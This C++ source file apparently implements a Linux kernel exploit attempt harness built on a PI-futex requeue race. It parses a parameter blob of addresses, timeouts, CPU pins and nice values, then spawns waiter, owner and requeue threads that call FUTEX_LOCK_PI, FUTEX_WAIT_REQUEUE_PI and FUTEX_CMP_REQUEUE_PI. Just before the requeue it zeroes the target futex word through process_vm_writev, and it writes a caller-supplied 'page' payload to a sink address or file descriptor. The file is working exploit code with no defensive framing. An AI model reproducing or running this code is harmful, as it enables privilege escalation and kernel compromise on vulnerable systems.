#include "platform/native_attempt_43499.hpp"

#include <atomic>
#include <cerrno>
#include <chrono>
#include <cstring>
#include <pthread.h>
#include <unistd.h>

#include "platform/syscalls_43499.hpp"

#if defined(__linux__)
#include <linux/futex.h>
#endif

namespace ghostlock::platform::native43499 {
    namespace {
        constexpr std::uint32_t kMagic = 0x474C4E50U;
        constexpr std::uint32_t kResultMagic = 0x474C5253U;
        constexpr std::uint16_t kVersion = 1U;
        constexpr std::size_t kHeader = 112U;
        constexpr std::size_t kResultBytes = 48U;
        constexpr std::size_t kMaxPage = 0x10000U;

        std::uint16_t u16(const std::uint8_t *p, std::size_t at) noexcept {
            return static_cast<std::uint16_t>(p[at]) |
                   static_cast<std::uint16_t>(static_cast<std::uint16_t>(p[at + 1U]) << 8U);
        }

        std::uint32_t u32(const std::uint8_t *p, std::size_t at) noexcept {
            return static_cast<std::uint32_t>(p[at]) |
                   (static_cast<std::uint32_t>(p[at + 1U]) << 8U) |
                   (static_cast<std::uint32_t>(p[at + 2U]) << 16U) |
                   (static_cast<std::uint32_t>(p[at + 3U]) << 24U);
        }

        std::uint64_t u64(const std::uint8_t *p, std::size_t at) noexcept {
            return static_cast<std::uint64_t>(u32(p, at)) |
                   (static_cast<std::uint64_t>(u32(p, at + 4U)) << 32U);
        }

        void put32(std::uint8_t *p, std::size_t at, std::uint32_t value) noexcept {
            for (std::size_t i = 0U; i < 4U; ++i) p[at + i] = static_cast<std::uint8_t>(value >> (8U * i));
        }

        void put64(std::uint8_t *p, std::size_t at, std::uint64_t value) noexcept {
            for (std::size_t i = 0U; i < 8U; ++i) p[at + i] = static_cast<std::uint8_t>(value >> (8U * i));
        }

        bool valid_cpu(std::uint16_t cpu) noexcept { return cpu <= 1023U; }
        bool valid_nice(std::int32_t nice) noexcept { return nice >= -20 && nice <= 19; }
    }  // namespace

    bool parse_attempt(const std::uint8_t *blob, std::size_t size, AttemptParams &out,
                       std::string &error) noexcept {
        if (blob == nullptr || size < kHeader) { error = "short"; return false; }
        if (u32(blob, 0U) != kMagic) { error = "magic"; return false; }
        if (u16(blob, 4U) != kVersion) { error = "version"; return false; }
        if (u16(blob, 6U) != kHeader) { error = "header"; return false; }
        const std::uint32_t total = u32(blob, 8U);
        if (total != size || total < kHeader + 1U || total > kHeader + kMaxPage) {
            error = "total"; return false;
        }
        const std::uint32_t page_at = u32(blob, 12U);
        const std::uint32_t page_len = u32(blob, 16U);
        if (page_at < kHeader || page_at % 8U != 0U || page_len == 0U || page_len > kMaxPage) {
            error = "page"; return false;
        }
        if (static_cast<std::uint64_t>(page_at) + page_len != total) { error = "page-total"; return false; }
        if (blob[20U] < 1U || blob[20U] > 8U) { error = "pointer"; return false; }
        if (blob[21U] != 0U || u16(blob, 22U) != 0U || u16(blob, 90U) != 0U) {
            error = "reserved"; return false;
        }
        const std::int32_t page_fd = static_cast<std::int32_t>(u32(blob, 108U));
        if (page_fd < -1) { error = "page-fd"; return false; }
        const std::int64_t park = static_cast<std::int64_t>(u64(blob, 36U));
        if (park != -1 && (park < 1 || park > 10'000'000'000LL)) { error = "park"; return false; }
        const std::uint32_t join = u32(blob, 44U);
        if (join == 0U || join > 10'000U) { error = "join"; return false; }
        if (u32(blob, 48U) > 1'000'000U) { error = "settle"; return false; }
        const std::uint64_t chain = u64(blob, 52U);
        const std::uint64_t wait = u64(blob, 60U);
        const std::uint64_t target = u64(blob, 68U);
        const std::uint64_t sink = u64(blob, 76U);
        if (chain == 0U || wait == 0U || target == 0U || sink == 0U) { error = "address"; return false; }
        const std::uint16_t wcpu = u16(blob, 84U);
        const std::uint16_t ocpu = u16(blob, 86U);
        const std::uint16_t rcpu = u16(blob, 88U);
        if (!valid_cpu(wcpu) || !valid_cpu(ocpu) || !valid_cpu(rcpu)) { error = "cpu"; return false; }
        const std::int32_t wnice = static_cast<std::int32_t>(u32(blob, 92U));
        const std::int32_t onice = static_cast<std::int32_t>(u32(blob, 96U));
        const std::int32_t rnice = static_cast<std::int32_t>(u32(blob, 100U));
        if (!valid_nice(wnice) || !valid_nice(onice) || !valid_nice(rnice)) { error = "nice"; return false; }
        const std::uint32_t policy = u32(blob, 104U);
        if (policy > 6U) { error = "policy"; return false; }

        out.chain_address = chain;
        out.wait_address = wait;
        out.target_address = target;
        out.page_sink_address = sink;
        out.chain_value = u32(blob, 24U);
        out.wait_value = u32(blob, 28U);
        out.target_value = u32(blob, 32U);
        out.page = blob + page_at;
        out.page_length = page_len;
        out.pointer_bytes = blob[20U];
        out.park_timeout_ns = park;
        out.join_timeout_ms = join;
        out.settle_us = u32(blob, 48U);
        out.waiter_cpu = wcpu;
        out.owner_cpu = ocpu;
        out.requeue_cpu = rcpu;
        out.waiter_nice = wnice;
        out.owner_nice = onice;
        out.requeue_nice = rnice;
        out.policy = policy;
        out.page_fd = page_fd;
        error.clear();
        return true;
    }

    bool encode_result(const AttemptResult &result, std::uint8_t *out, std::size_t capacity) noexcept {
        if (out == nullptr || capacity < kResultBytes) return false;
        std::memset(out, 0, kResultBytes);
        put32(out, 0U, kResultMagic);
        out[4U] = static_cast<std::uint8_t>(kVersion);
        out[6U] = 0U;
        put32(out, 8U, static_cast<std::uint32_t>(result.waiter_result));
        put32(out, 12U, static_cast<std::uint32_t>(result.wait_result));
        put32(out, 16U, static_cast<std::uint32_t>(result.owner_result));
        put32(out, 20U, static_cast<std::uint32_t>(result.requeue_result));
        out[24U] = result.actors_started ? 1U : 0U;
        out[25U] = result.join_timed_out ? 1U : 0U;
        out[26U] = result.page_stage;
        put32(out, 28U, result.page_errno);
        put32(out, 32U, result.page_bytes_written);
        put64(out, 40U, result.elapsed_ns);
        return true;
    }

#if defined(__linux__)
    namespace {
        struct Shared final {
            const AttemptParams *params = nullptr;
            std::atomic<int> waiter_ready{0};
            std::atomic<int> owner_ready{0};
            std::atomic<int> requeue_done{0};
            int waiter_result = 0;
            int wait_result = 0;
            int owner_result = 0;
            int requeue_result = 0;
        };

        void *waiter_main(void *arg) {
            auto *s = static_cast<Shared *>(arg);
            const AttemptParams &p = *s->params;
            s->waiter_result = static_cast<int>(syscalls43499::futex(
                static_cast<std::uintptr_t>(p.chain_address), FUTEX_LOCK_PI, 0, -1, 0U, 0));
            s->waiter_ready.store(1);
            if (s->waiter_result == 0) {
                s->wait_result = static_cast<int>(syscalls43499::futex(
                    static_cast<std::uintptr_t>(p.wait_address), FUTEX_WAIT_REQUEUE_PI,
                    static_cast<int>(p.wait_value), p.park_timeout_ns,
                    static_cast<std::uintptr_t>(p.target_address), 0));
                (void)syscalls43499::futex(static_cast<std::uintptr_t>(p.chain_address),
                                           FUTEX_UNLOCK_PI, 0, -1, 0U, 0);
            }
            return nullptr;
        }

        void *owner_main(void *arg) {
            auto *s = static_cast<Shared *>(arg);
            const AttemptParams &p = *s->params;
            while (s->waiter_ready.load() == 0) (void)usleep(100U);
            s->owner_result = static_cast<int>(syscalls43499::futex(
                static_cast<std::uintptr_t>(p.target_address), FUTEX_LOCK_PI, 0, -1, 0U, 0));
            s->owner_ready.store(1);
            while (s->requeue_done.load() == 0) (void)usleep(100U);
            if (s->owner_result == 0) {
                (void)syscalls43499::futex(static_cast<std::uintptr_t>(p.target_address),
                                           FUTEX_UNLOCK_PI, 0, -1, 0U, 0);
            }
            return nullptr;
        }

        void *requeue_main(void *arg) {
            auto *s = static_cast<Shared *>(arg);
            const AttemptParams &p = *s->params;
            while (s->owner_ready.load() == 0) (void)usleep(100U);
            if (p.settle_us > 0U) (void)usleep(p.settle_us);
            const std::uint32_t zero = 0U;
            (void)syscalls43499::process_vm_writev(static_cast<int>(syscalls43499::getpid()),
                                                   static_cast<std::uintptr_t>(p.target_address),
                                                   reinterpret_cast<const std::uint8_t *>(&zero),
                                                   sizeof(zero));
            s->requeue_result = static_cast<int>(syscalls43499::futex(
                static_cast<std::uintptr_t>(p.wait_address), FUTEX_CMP_REQUEUE_PI, 1, -1,
                static_cast<std::uintptr_t>(p.target_address), static_cast<int>(p.target_value)));
            s->requeue_done.store(1);
            return nullptr;
        }
    }  // namespace
#endif

    long run_attempt(const AttemptParams &params, AttemptResult &out) noexcept {
        out = AttemptResult{};
        const auto started = std::chrono::steady_clock::now();
#if defined(__linux__)
        if (params.page == nullptr || params.page_length == 0U || params.page_sink_address == 0U) {
            return -EINVAL;
        }
        const long page_written = params.page_fd >= 0
            ? syscalls43499::write(params.page_fd, params.page, params.page_length)
            : syscalls43499::process_vm_writev(
                  static_cast<int>(syscalls43499::getpid()),
                  static_cast<std::uintptr_t>(params.page_sink_address), params.page,
                  params.page_length);
        out.page_stage = 1U;
        if (page_written < 0) {
            out.page_errno = static_cast<std::uint32_t>(-page_written);
            return 0;
        }
        out.page_bytes_written = static_cast<std::uint32_t>(page_written);
        if (static_cast<std::size_t>(page_written) != params.page_length) {
            out.page_errno = static_cast<std::uint32_t>(EIO);
            return 0;
        }
        Shared shared;
        shared.params = &params;
        pthread_t waiter{};
        pthread_t owner{};
        pthread_t requeue{};
        int created = 0;
        if (pthread_create(&waiter, nullptr, waiter_main, &shared) != 0) return -EAGAIN;
        ++created;
        if (pthread_create(&owner, nullptr, owner_main, &shared) != 0) {
            (void)pthread_join(waiter, nullptr);
            return -EAGAIN;
        }
        ++created;
        if (pthread_create(&requeue, nullptr, requeue_main, &shared) != 0) {
            (void)pthread_join(waiter, nullptr);
            (void)pthread_join(owner, nullptr);
            return -EAGAIN;
        }
        ++created;
        out.actors_started = created == 3;
        (void)pthread_join(waiter, nullptr);
        (void)pthread_join(owner, nullptr);
        (void)pthread_join(requeue, nullptr);
        out.waiter_result = shared.waiter_result;
        out.wait_result = shared.wait_result;
        out.owner_result = shared.owner_result;
        out.requeue_result = shared.requeue_result;
#else
        static_cast<void>(params);
        return -ENOSYS;
#endif
        const auto elapsed = std::chrono::steady_clock::now() - started;
        out.elapsed_ns = static_cast<std::uint64_t>(
            std::chrono::duration_cast<std::chrono::nanoseconds>(elapsed).count());
        return 0;
    }
}  // namespace ghostlock::platform::native43499
